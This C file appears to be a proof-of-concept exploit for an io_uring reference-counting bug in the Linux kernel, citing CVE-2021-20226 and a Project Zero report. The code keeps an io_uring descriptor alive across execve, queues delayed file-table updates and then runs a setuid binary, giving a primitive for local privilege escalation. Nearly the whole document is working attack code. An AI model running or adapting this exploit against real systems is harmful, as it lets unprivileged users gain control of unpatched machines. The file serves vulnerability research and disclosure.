// https://bugs.chromium.org/p/project-zero/issues/detail?id=2089
// https://flattsecurity.medium.com/cve-2021-20226-a-reference-counting-bug-which-leads-to-local-privilege-escalation-in-io-uring-e946bd69177a
// https://www.zerodayinitiative.com/blog/2021/4/22/cve-2021-20226-a-reference-counting-bug-in-the-linux-kernel-iouring-subsystem
// sudo gcc -o suid-binary suid-binary.c -static
// sudo chmod 4755 suid-binary (as root in the vm)

#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/fcntl.h>
#include <err.h>
#include <unistd.h>
#include <sys/mman.h>
#include <linux/io_uring.h>

#define SYSCHK(x) ({          \
  typeof(x) __res = (x);      \
  if (__res == (typeof(x))-1) \
    err(1, "SYSCHK(" #x ")"); \
  __res;                      \
})

static int uring_fd;

static int child_fn(void *dummy) {
  sleep(2);
  puts("uring fdinfo:");
  puts("===============================");
  char cmd[1000];
  sprintf(cmd, "cat /proc/$PPID/fdinfo/%d", uring_fd);
  system(cmd);
  puts("===============================");
  fflush(stdout);
  pid_t parent = getppid();
  if (parent != 1) kill(parent, SIGKILL);
  exit(0);
}

static char child_stack[1024*1024*8];

int main(void) {
  // initialize uring
  struct io_uring_params params = { };
  uring_fd = SYSCHK(syscall(__NR_io_uring_setup, /*entries=*/10, &params));
  unsigned char *sq_ring = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
                                       MAP_SHARED, uring_fd,
                                       IORING_OFF_SQ_RING));
  unsigned char *cq_ring = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
                                       MAP_SHARED, uring_fd,
                                       IORING_OFF_CQ_RING));
  struct io_uring_sqe *sqes = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
                                          MAP_SHARED, uring_fd,
                                          IORING_OFF_SQES));

  // uring prep: set ->nr_user_files = 1
  int fd0 = 0;
  SYSCHK(syscall(__NR_io_uring_register, uring_fd, IORING_REGISTER_FILES, &fd0, 1));

  // keep uring fd alive across execve
  if (fcntl(uring_fd, F_SETFD, 0))
    err(1, "unable to clear CLOEXEC");

  int free_fd = dup(0);
  close(free_fd);
  printf("free_fd = %d\n", free_fd);

  // prepare delayed uring op
  struct timespec ts = { .tv_sec = 1 };
  sqes[0] = (struct io_uring_sqe) {
    .opcode = IORING_OP_TIMEOUT,
    .flags = IOSQE_IO_HARDLINK,
    .len = 1,
    .addr = (unsigned long)&ts
  };
  sqes[1] = (struct io_uring_sqe) {
    .opcode = IORING_OP_FILES_UPDATE,
    .addr = (unsigned long) &free_fd,
    .len = 1,
    .off = 0,
  };
  ((int*)(sq_ring + params.sq_off.array))[0] = 0;
  ((int*)(sq_ring + params.sq_off.array))[1] = 1;
  (*(int*)(sq_ring + params.sq_off.tail)) += 2;

  int submitted = SYSCHK(syscall(__NR_io_uring_enter, uring_fd,
                                 /*to_submit=*/2, /*min_complete=*/0,
                                 /*flags=*/0, /*sig=*/NULL, /*sigsz=*/0));
  printf("submitted %d\n", submitted);

  int child = SYSCHK(clone(child_fn, child_stack+sizeof(child_stack), CLONE_VM|SIGCHLD, NULL));
  if (child > 0) {
    execlp("./suid-binary", "./suid-binary", NULL);
    err(1, "unable to exec");
  }
}